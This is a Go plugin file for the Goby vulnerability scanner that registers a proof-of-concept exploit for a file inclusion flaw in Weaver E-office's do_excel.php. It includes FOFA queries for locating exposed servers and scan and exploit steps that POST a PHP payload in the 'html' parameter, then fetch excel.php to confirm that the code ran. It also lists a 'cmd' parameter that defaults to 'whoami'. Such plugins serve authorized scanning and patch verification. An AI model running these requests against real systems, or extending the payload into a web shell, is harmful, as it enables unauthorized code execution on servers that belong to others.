package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver E-office do_excel.php file html  params file inclusion vulnerability",
    "Description": "<p>e-office is a standard collaborative mobile office platform.</p><p>There is a file inclusion vulnerability in e-office, through which an attacker can write malicious files.</p>",
    "Impact": "<p>There is a file inclusion vulnerability in e-office, through which an attacker can write malicious files.</p>",
    "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability, please update it in time:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p>",
    "Product": "Weaver-EOffice",
    "VulType": [
        "File Inclusion"
    ],
    "Tags": [
        "File Inclusion",
        "Information technology application innovation industry"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office do_excel.php 文件 html 参数文件包含漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>e-office是上海泛微网络科技股份有限公司一款标准协同移动办公平台。</p><p>e-office存在文件包含漏洞，攻击者可以通过该漏洞写入恶意文件。</p>",
            "Recommendation": "<p>厂商已发布补丁修复漏洞，请及时更新：<span style=\"color: var(--primaryFont-color);\"><a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></span></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">e-office存在文件包含漏洞，攻击者可以通过该漏洞写入恶意文件。</span><br></p>",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含",
                "信创"
            ]
        },
        "EN": {
            "Name": "Weaver E-office do_excel.php file html  params file inclusion vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>e-office is a standard collaborative mobile office platform.</p><p>There is a file inclusion vulnerability in e-office, through which an attacker can write malicious files.</p>",
            "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability, please update it in time:<a href=\"https://www.weaver.com.cn/\" target=\"_blank\">https://www.weaver.com.cn/</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">There is a file inclusion vulnerability in e-office, through which an attacker can write malicious files.</span><br></p>",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion",
                "Information technology application innovation industry"
            ]
        }
    },
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Author": "1243099890@qq.com",
    "Homepage": "www.weaver.com.cn",
    "DisclosureDate": "2022-03-23",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-43247"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/charge/charge_list/do_excel.php",
                "follow_redirect": true,
                "header": {
                    "Content-Length": "52",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "html=<?php echo md5(233);unlink(__FILE__);?>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/charge/charge_list/excel.php",
                "follow_redirect": true,
                "header": {
                    "Content-Length": "52",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/charge/charge_list/do_excel.php",
                "follow_redirect": true,
                "header": {
                    "Content-Length": "52",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "html=<?php echo md5(233);unlink(__FILE__);?>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/charge/charge_list/excel.php",
                "follow_redirect": true,
                "header": {
                    "Content-Length": "52",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6977"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
